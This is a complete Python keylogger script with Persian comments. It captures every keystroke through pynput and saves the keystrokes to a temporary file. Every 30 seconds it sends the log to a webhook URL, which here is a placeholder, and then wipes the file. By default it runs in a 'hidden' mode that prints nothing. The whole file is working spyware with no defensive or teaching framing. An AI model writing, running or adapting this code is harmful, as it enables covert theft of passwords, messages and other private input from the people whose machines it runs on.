import pynput
from pynput.keyboard import Key, Listener
import requests
import time
import threading
import os
import argparse
from datetime import datetime

# تنظیمات
WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE'  # جایگزین با URL واقعی وب‌هوک
LOG_INTERVAL = 30  # ثانیه
TEMP_LOG_FILE = 'temp_log.txt'

# پردازش آرگومان‌ها
parser = argparse.ArgumentParser(description='Keylogger with hidden/visible modes')
parser.add_argument('--mode', choices=['hidden', 'visible'], default='hidden', help='Run in hidden or visible mode')
args = parser.parse_args()
IS_VISIBLE = args.mode == 'visible'

def write_to_log(key):
    try:
        # فقط کلیدهای printable
        if hasattr(key, 'char') and key.char:
            char = key.char
        elif key == Key.space:
            char = ' '
        elif key == Key.enter:
            char = '\n'
        elif key == Key.tab:
            char = '\t'
        else:
            char = f'[{key.name}]'
        
        with open(TEMP_LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(char)
        
        if IS_VISIBLE:
            print(f"Logged: {char}")
    except Exception as e:
        if IS_VISIBLE:
            print(f"Log error: {e}")

def send_log():
    try:
        if os.path.exists(TEMP_LOG_FILE) and os.path.getsize(TEMP_LOG_FILE) > 0:
            with open(TEMP_LOG_FILE, 'r', encoding='utf-8') as f:
                log_content = f.read().strip()
            
            if log_content:
                payload = {
                    'log': log_content,
                    'timestamp': datetime.now().isoformat()
                }
                
                response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
                if response.status_code == 200:
                    if IS_VISIBLE:
                        print("Log sent successfully")
                    open(TEMP_LOG_FILE, 'w').close()  # پاک کردن فایل موقت
                else:
                    if IS_VISIBLE:
                        print(f"Send failed: {response.status_code}")
    except Exception as e:
        if IS_VISIBLE:
            print(f"Send error: {e}")

def on_press(key):
    write_to_log(key)

def periodic_send():
    while True:
        time.sleep(LOG_INTERVAL)
        send_log()

if __name__ == '__main__':
    if os.path.exists(TEMP_LOG_FILE):
        open(TEMP_LOG_FILE, 'w').close()
    
    send_thread = threading.Thread(target=periodic_send, daemon=True)
    send_thread.start()
    
    if IS_VISIBLE:
        print("Keylogger started in visible mode. Press Ctrl+C to stop.")
    
    with Listener(on_press=on_press) as listener:
        listener.join()